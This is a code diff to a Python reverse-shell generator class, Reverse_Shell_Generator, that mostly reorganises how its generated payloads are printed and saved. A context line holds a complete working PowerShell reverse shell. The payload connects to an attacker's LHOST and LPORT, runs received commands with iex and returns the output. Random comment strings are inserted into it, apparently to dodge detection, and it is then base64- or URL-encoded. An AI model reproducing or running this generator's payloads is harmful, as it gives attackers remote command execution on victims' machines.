@@ -105,10 +105,7 @@ class Reverse_Shell_Generator:
                  Random_Value ='<# '+''.join(secrets.choice(Table) for i in range(20))+' #>'
                  self.result = '$client = New-Object '+ Random_Value +' System.Net.Sockets.TCPClient("'+f'{self.args.LHOST}'+'",'+f'{self.args.LPORT}'+'); '+Random_Value+' $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}; '+Random_Value+' while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'+Random_Value+'$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + $(gl) + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
                  self.Base64() 
-                 print('\n'+'='*30 +'\n') 
-                 print('[*] Generated  : Done !!')
-                 print('[*] File Name  : powershell.ps1')
-                 print('[+] File Path  : ' +path+'/')       
+ 
                 
             elif 'php' in self.args.type  and self.args.pentestmonkey :
                   if os.path.exists('./Store_shell/PHP.php'):
@@ -211,7 +208,6 @@ class Reverse_Shell_Generator:
                   print('[*] File Name  : pyshellwindows.py')
                   print('[+] File Path  : ' +path+'/')         
             elif 'python' in self.args.type and  not self.args.windows  and self.args.onefile :
-                   
                   if os.path.exists("./Store_shell/pyshellLinux.py"):
                      os.remove("./Store_shell/pyshellLinux.py")
                   else:
@@ -258,40 +254,70 @@ class Reverse_Shell_Generator:
                        self.result = urllib.parse.quote(self.result)
                        print('[*] TYPE    : '+self.args.type +'\n' +'[*] LHOST   : ' +self.args.LHOST\
                        +'\n' +'[*] LPORT   : ' +self.args.LPORT+'\n'+'[*] Encode  : Base64'+'\n'+'='*30 +'\n')
-                       print(self.result)
+                       if ('powershell' in self.args.type and not self.args.output): 
+                            print(self.result)
+                       elif ('powershell' in self.args.type and self.args.output):   
+                            print(self.result) 
+                            print('\n'+'='*30 +'\n') 
+                            print('[*] Generated  : Done !!')
+                            print('[*] File Name  : powershell.ps1')
+                            print('[+] File Path  : ' +path+'/')      
                   else:
-                      self.result = bytes(self.result.encode())
-                      self.result = base64.b64encode(self.result)
-                      self.result = str(self.result).replace("b'",'',1).replace("'",'')
-                      print('[*] TYPE    : '+self.args.type +'\n' +'[*] LHOST   : ' +self.args.LHOST+'\n'\
-                       +'[*] LPORT   : ' +self.args.LPORT+'\n'+'[*] Encode  : Base64'+'\n'+'='*30 +'\n')
-                      print(self.result)
+                      if self.args.output:
+
+                        print('[*] TYPE    : '+self.args.type +'\n' +'[*] LHOST   : ' +self.args.LHOST+'\n'\
+                         +'[*] LPORT   : ' +self.args.LPORT+'\n'+'[*] Encode  : Base64'+'\n'+'='*30 +'\n')
+                        self.result = bytes(self.result.encode())
+                        self.result = base64.b64encode(self.result)
+                        self.result = str(self.result).replace("b'",'',1).replace("'",'')
+                        print(self.result)
+                        print('\n'+'='*30 +'\n') 
+                        print('[*] Generated  : Done !!')
+                        print('[*] File Name  : powershell.ps1')
+                        print('[+] File Path  : ' +path+'/')
+                      else:  
+                         if not  self.args.output :
+                             self.result = bytes(self.result.encode())
+                             self.result = base64.b64encode(self.result)
+                             self.result = str(self.result).replace("b'",'',1).replace("'",'')
+                             print('[*] TYPE    : '+self.args.type +'\n' +'[*] LHOST   : ' +self.args.LHOST+'\n'\
+                             +'[*] LPORT   : ' +self.args.LPORT+'\n'+'[*] Encode  : Base64'+'\n'+'='*30 +'\n')
+                             print(self.result)
+
              elif self.args.urlencode :
                   self.URL_encode()       
              else:
                   print('[*] TYPE      : '+self.args.type +'\n' +'[*] LHOST     : ' +self.args.LHOST+'\n'\
                    +'[*] LPORT     : ' +self.args.LPORT+'\n'+'='*30 +'\n')
                   print(self.result)
-             if self.args.output and 'powershell' not in self.args.type:
-                with open("./Store_shell/"+self.args.type+".txt",'w') as File_write :
-                     File_write.write(self.result)  
-             else:
-                if self.args.output and 'powershell'  in self.args.type:
-                    with open("./Store_shell/"+self.args.type+".ps1",'w') as File_write :
-                        File_write.write(self.result)     
+                  if self.args.output and not  'powershell' in self.args.type:
+                      with open("./Store_shell/"+self.args.type+".txt",'w') as File_write :
+                            File_write.write(self.result)  
+                  else:
+                     if self.args.output and 'powershell'  in self.args.type:
+                        with open("./Store_shell/"+self.args.type+".ps1",'w') as File_write :
+                             File_write.write(self.result)
+                        print('\n'+'='*30 +'\n') 
+                        print('[*] Generated  : Done !!')
+                        print('[*] File Name  : powershell.ps1')
+                        print('[+] File Path  : ' +path+'/')             
         def URL_encode (self):
             if self.args.urlencode :
                  self.result = urllib.parse.quote(self.result)
                  print('[*] TYPE      : '+self.args.type +'\n' +'[*] LHOST     : ' +self.args.LHOST+'\n'\
                   +'[*] LPORT     : ' +self.args.LPORT+'\n'+'[*] Encode    : Urlencode'+'\n'+'='*30 +'\n')
                  print(self.result)
-            if self.args.output and 'powershell' not in self.args.type:
+            if self.args.output and not 'powershell' in self.args.type:
                 with open("./Store_shell/"+self.args.type+".txt",'w') as File_write :
                      File_write.write(self.result)  
             else:
                 if self.args.output and 'powershell'  in self.args.type:
                     with open("./Store_shell/"+self.args.type+".ps1",'w') as File_write :
-                        File_write.write(self.result)             
+                        File_write.write(self.result)   
+                    print('\n'+'='*30 +'\n') 
+                    print('[*] Generated  : Done !!')
+                    print('[*] File Name  : powershell.ps1')
+                    print('[+] File Path  : ' +path+'/')               
         def Check_Inpiut(self):                 
             if self.args.type in list_input:
                pass
